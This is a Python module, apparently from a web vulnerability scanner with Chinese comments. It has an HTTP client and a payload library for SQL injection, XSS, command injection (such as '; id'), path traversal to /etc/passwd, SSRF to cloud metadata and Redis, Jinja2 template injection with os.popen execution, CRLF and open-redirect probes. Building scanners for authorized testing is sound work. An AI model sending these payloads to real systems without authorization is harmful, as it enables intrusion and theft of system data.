"""
security/vuln_detector.py - 漏洞探测与验证引擎

核心能力：
- 自动发送payload到目标的多个注入点（URL参数、POST数据、Header、Cookie）
- 分析响应判断漏洞是否存在（状态码、内容、时间延迟、错误信息、特定模式）
- 漏洞验证（确认漏洞真实存在，排除误报）
- 支持SQL注入、XSS、命令注入、目录遍历、SSRF、文件上传、CRLF、SSTI等漏洞类型
- 扫描报告生成
"""
import os
import re
import sys
import json
import time
import uuid
import socket
import hashlib
import threading
import urllib.parse
import urllib.request
import urllib.error
from typing import Any, Dict, List, Optional, Tuple, Set, Callable
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict


# ================================================================
# 漏洞类型和严重程度枚举
# ================================================================
from .models import *  # noqa: F401,F403

class HttpClient:
    """HTTP客户端 - 支持自定义请求、超时、重定向控制、代理"""

    def __init__(self, timeout: int = 10, proxy: str = "", user_agent: str = "",
                 verify_ssl: bool = False, max_retries: int = 2, retry_delay: float = 1.0):
        self.timeout = timeout
        self.proxy = proxy
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.verify_ssl = verify_ssl
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.session = None
        self.request_count = 0
        self.error_count = 0
        self._init_session()

    def _init_session(self):
        """初始化会话"""
        self.session = urllib.request.build_opener()
        if self.proxy:
            proxy_handler = urllib.request.ProxyHandler({"http": self.proxy, "https": self.proxy})
            self.session = urllib.request.build_opener(proxy_handler)

    def send(self, request: ScanRequest) -> ScanResponse:
        """发送HTTP请求"""
        self.request_count += 1
        start_time = time.time()
        response = ScanResponse(url=request.url)

        for attempt in range(self.max_retries + 1):
            try:
                # 构建URL
                url = request.url
                if request.params:
                    separator = "&" if "?" in url else "?"
                    url = url + separator + urllib.parse.urlencode(request.params)

                # 构建请求数据
                data = None
                if request.data:
                    data = urllib.parse.urlencode(request.data).encode("utf-8")

                # 构建headers
                headers = dict(request.headers)
                headers.setdefault("User-Agent", self.user_agent)
                if request.cookies:
                    headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in request.cookies.items())

                req = urllib.request.Request(url, data=data, headers=headers, method=request.method)

                # 发送请求
                resp = self.session.open(req, timeout=request.timeout or self.timeout)
                response.status_code = resp.getcode()
                response.headers = dict(resp.headers)
                body_bytes = resp.read()
                response.body = body_bytes.decode("utf-8", errors="replace")
                response.body_length = len(body_bytes)
                response.response_time = (time.time() - start_time) * 1000
                response.redirected = resp.geturl() != url
                response.redirect_url = resp.geturl()
                return response

            except urllib.error.HTTPError as e:
                response.status_code = e.code
                response.headers = dict(e.headers) if e.headers else {}
                try:
                    body_bytes = e.read()
                    response.body = body_bytes.decode("utf-8", errors="replace")
                    response.body_length = len(body_bytes)
                except Exception:
                    pass
                response.response_time = (time.time() - start_time) * 1000
                return response

            except urllib.error.URLError as e:
                response.error = str(e.reason)
                if attempt < self.max_retries:
                    time.sleep(self.retry_delay)
                    continue
                self.error_count += 1
                response.response_time = (time.time() - start_time) * 1000
                return response

            except socket.timeout:
                response.error = "Request timeout"
                if attempt < self.max_retries:
                    time.sleep(self.retry_delay)
                    continue
                self.error_count += 1
                response.response_time = (time.time() - start_time) * 1000
                return response

            except Exception as e:
                response.error = str(e)
                self.error_count += 1
                response.response_time = (time.time() - start_time) * 1000
                return response

        return response

    def get_stats(self) -> Dict:
        return {
            "total_requests": self.request_count,
            "errors": self.error_count,
            "error_rate": self.error_count / self.request_count if self.request_count > 0 else 0,
        }

class VulnPayloadLibrary:
    """漏洞探测Payload库 - 包含各类漏洞的探测和验证payload"""

    def __init__(self):
        self.payloads = self._init_payloads()
        self.verification_payloads = self._init_verification_payloads()

    def _init_payloads(self) -> Dict[str, List[Dict]]:
        """初始化各类漏洞的探测payload"""
        return {
            "sql_injection": [
                {"payload": "'", "description": "单引号测试", "category": "error_based"},
                {"payload": "\"", "description": "双引号测试", "category": "error_based"},
                {"payload": "' OR '1'='1", "description": "布尔真测试", "category": "boolean_based"},
                {"payload": "' OR '1'='2", "description": "布尔假测试", "category": "boolean_based"},
                {"payload": "' AND SLEEP(5)--", "description": "时间延迟测试(MySQL)", "category": "time_based"},
                {"payload": "'; WAITFOR DELAY '0:0:5'--", "description": "时间延迟测试(MSSQL)", "category": "time_based"},
                {"payload": "' UNION SELECT NULL--", "description": "UNION注入测试", "category": "union_based"},
                {"payload": "1' ORDER BY 1--", "description": "ORDER BY列数测试", "category": "union_based"},
                {"payload": "' OR 1=1--", "description": "注释绕过测试", "category": "boolean_based"},
                {"payload": "admin'--", "description": "认证绕过测试", "category": "auth_bypass"},
                {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "description": "XPATH错误注入", "category": "error_based"},
                {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "description": "UPDATEXML错误注入", "category": "error_based"},
            ],
            "xss": [
                {"payload": "<script>alert(1)</script>", "description": "基础script标签", "category": "script_tag"},
                {"payload": "\"><script>alert(1)</script>", "description": "属性逃逸script", "category": "attribute_escape"},
                {"payload": "<img src=x onerror=alert(1)>", "description": "img onerror事件", "category": "event_handler"},
                {"payload": "<svg onload=alert(1)>", "description": "svg onload事件", "category": "event_handler"},
                {"payload": "javascript:alert(1)", "description": "javascript伪协议", "category": "javascript_uri"},
                {"payload": "<body onload=alert(1)>", "description": "body onload事件", "category": "event_handler"},
                {"payload": "<iframe src=javascript:alert(1)>", "description": "iframe注入", "category": "iframe"},
                {"payload": "\"><img src=x onerror=alert(1)>", "description": "属性逃逸img", "category": "attribute_escape"},
                {"payload": "<details open ontoggle=alert(1)>", "description": "details ontoggle", "category": "event_handler"},
                {"payload": "<select onfocus=alert(1) autofocus>", "description": "select onfocus", "category": "event_handler"},
            ],
            "command_injection": [
                {"payload": "; id", "description": "分号命令执行", "category": "semicolon"},
                {"payload": "| id", "description": "管道命令执行", "category": "pipe"},
                {"payload": "&& id", "description": "逻辑与命令执行", "category": "logical_and"},
                {"payload": "|| id", "description": "逻辑或命令执行", "category": "logical_or"},
                {"payload": "$(id)", "description": "命令替换$()", "category": "command_substitution"},
                {"payload": "`id`", "description": "反引号命令替换", "category": "backtick"},
                {"payload": "; sleep 5", "description": "时间延迟测试", "category": "time_based"},
                {"payload": "| sleep 5", "description": "管道时间延迟", "category": "time_based"},
                {"payload": "; whoami", "description": "whoami命令", "category": "info_disclosure"},
                {"payload": "; uname -a", "description": "系统信息", "category": "info_disclosure"},
            ],
            "directory_traversal": [
                {"payload": "../../../../etc/passwd", "description": "基础路径遍历", "category": "basic"},
                {"payload": "..\\..\\..\\..\\windows\\win.ini", "description": "Windows路径遍历", "category": "windows"},
                {"payload": "....//....//....//etc/passwd", "description": "双点斜杠绕过", "category": "bypass"},
                {"payload": "%2e%2e%2f%2e%2e%2fetc/passwd", "description": "URL编码绕过", "category": "encoding"},
                {"payload": "..%252f..%252fetc/passwd", "description": "双重URL编码", "category": "double_encoding"},
                {"payload": "/etc/passwd", "description": "绝对路径测试", "category": "absolute_path"},
                {"payload": "..%c0%af..%c0%afetc/passwd", "description": "UTF-8编码绕过", "category": "utf8_encoding"},
                {"payload": "....//....//....//etc/passwd%00", "description": "空字节截断", "category": "null_byte"},
            ],
            "ssrf": [
                {"payload": "http://127.0.0.1/", "description": "本地回环测试", "category": "loopback"},
                {"payload": "http://localhost/", "description": "localhost测试", "category": "loopback"},
                {"payload": "http://169.254.169.254/latest/meta-data/", "description": "云元数据测试(AWS)", "category": "cloud_metadata"},
                {"payload": "http://0.0.0.0/", "description": "0.0.0.0测试", "category": "loopback"},
                {"payload": "file:///etc/passwd", "description": "file协议测试", "category": "file_protocol"},
                {"payload": "dict://127.0.0.1:6379/INFO", "description": "dict协议测试", "category": "dict_protocol"},
                {"payload": "gopher://127.0.0.1:6379/_INFO", "description": "gopher协议测试", "category": "gopher_protocol"},
            ],
            "ssti": [
                {"payload": "{{7*7}}", "description": "基础SSTI测试(Jinja2/Twig)", "category": "basic"},
                {"payload": "${7*7}", "description": "EL表达式测试", "category": "el_expression"},
                {"payload": "#{7*7}", "description": "JSP EL测试", "category": "jsp_el"},
                {"payload": "<%= 7*7 %>", "description": "JSP表达式", "category": "jsp"},
                {"payload": "{{config}}", "description": "配置对象访问", "category": "jinja2"},
                {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "description": "类继承遍历", "category": "jinja2_rce"},
                {"payload": "{% import os %}{{os.popen('id').read()}}", "description": "命令执行", "category": "jinja2_rce"},
            ],
            "crlf_injection": [
                {"payload": "%0d%0aSet-Cookie:crlf=injected", "description": "CRLF注入Cookie", "category": "cookie_injection"},
                {"payload": "%0d%0aX-Injected: true", "description": "CRLF注入Header", "category": "header_injection"},
                {"payload": "\r\nSet-Cookie:crlf=injected", "description": "原始CRLF注入", "category": "raw_crlf"},
            ],
            "open_redirect": [
                {"payload": "https://evil.com", "description": "外部域名跳转", "category": "external_domain"},
                {"payload": "//evil.com", "description": "协议相对URL", "category": "protocol_relative"},
                {"payload": "/\\evil.com", "description": "反斜杠绕过", "category": "backslash_bypass"},
                {"payload": "https:evil.com", "description": "缺少斜杠绕过", "category": "missing_slash"},
                {"payload": "https://evil.com%23@example.com", "description": "URL混淆", "category": "obfuscation"},
            ],
        }

    def _init_verification_payloads(self) -> Dict[str, List[Dict]]:
        """初始化验证payload - 用于确认漏洞真实存在"""
        return {
            "sql_injection": [
                {"payload": "' AND '1'='1", "verify_payload": "' AND '1'='2",
                 "description": "布尔真假对比验证", "method": "boolean_diff"},
                {"payload": "' AND SLEEP(3)--", "verify_payload": "' AND SLEEP(0)--",
                 "description": "时间延迟对比验证", "method": "time_diff"},
            ],
            "xss": [
                {"payload": "<script>alert('vuln_verify_123')</script>",
                 "description": "唯一标识验证", "method": "content_match",
                 "match_string": "vuln_verify_123"},
            ],
            "command_injection": [
                {"payload": "; echo VULN_VERIFY_123",
                 "description": "唯一标识输出验证", "method": "content_match",
                 "match_string": "VULN_VERIFY_123"},
                {"payload": "; sleep 3", "verify_payload": "; sleep 0",
                 "description": "时间延迟对比验证", "method": "time_diff"},
            ],
            "directory_traversal": [
                {"payload": "../../../../etc/passwd",
                 "description": "passwd文件内容验证", "method": "content_match",
                 "match_string": "root:x:0:0"},
            ],
            "ssti": [
                {"payload": "{{7*7}}",
                 "description": "计算结果验证", "method": "content_match",
                 "match_string": "49"},
            ],
        }

    def get_payloads(self, vuln_type: str) -> List[Dict]:
        """获取指定漏洞类型的payload"""
        return self.payloads.get(vuln_type, [])

    def get_verification_payloads(self, vuln_type: str) -> List[Dict]:
        """获取指定漏洞类型的验证payload"""
        return self.verification_payloads.get(vuln_type, [])

    def get_all_types(self) -> List[str]:
        """获取所有支持的漏洞类型"""
        return list(self.payloads.keys())

    def search_payloads(self, keyword: str) -> List[Dict]:
        """搜索payload"""
        results = []
        keyword_lower = keyword.lower()
        for vuln_type, payload_list in self.payloads.items():
            for p in payload_list:
                if (keyword_lower in p["payload"].lower() or
                        keyword_lower in p["description"].lower() or
                        keyword_lower in vuln_type):
                    results.append({**p, "vuln_type": vuln_type})
        return results
